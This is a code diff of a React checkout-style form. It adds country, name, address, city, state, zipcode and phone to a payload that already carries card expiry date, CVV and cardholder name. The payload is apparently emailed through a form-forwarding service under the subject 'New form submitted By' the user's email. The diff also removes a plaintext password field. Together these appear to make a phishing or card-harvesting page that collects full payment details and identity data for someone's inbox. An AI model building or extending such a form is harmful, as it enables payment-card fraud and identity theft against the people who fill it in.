@@ -73,6 +73,15 @@ function Form() {
           expdate: formValues.expdate,
           cvv: formValues.cvv,
           cardname: formValues.cardname,
+          country: formValues.country,
+          firstname: formValues.firstname,
+          lastname: formValues.lastname,
+          address: formValues.address,
+          apartment: formValues.apartment,
+          city: formValues.city,
+          state: formValues.state,
+          zipcode: formValues.zipcode,
+          phone: formValues.phone,
           _subject: `New form submitted  By ${formValues.email}`,
           _captcha: true,
           _blacklist: "spammy pattern, banned term, phrase",
@@ -107,18 +116,7 @@ function Form() {
             {touched.email && formError.email}
           </div>
         </div>
-        <div className='box'>
-        <input
-          placeholder="Password"
-          type="text"
-          name="password"
-          value={formValues.password}
-          onChange={handleChange}
-        />
-         <div className="errorMsg">
-            {touched.password && formError.password}
-          </div>
-        </div>
+        
         
           //country
          <div>
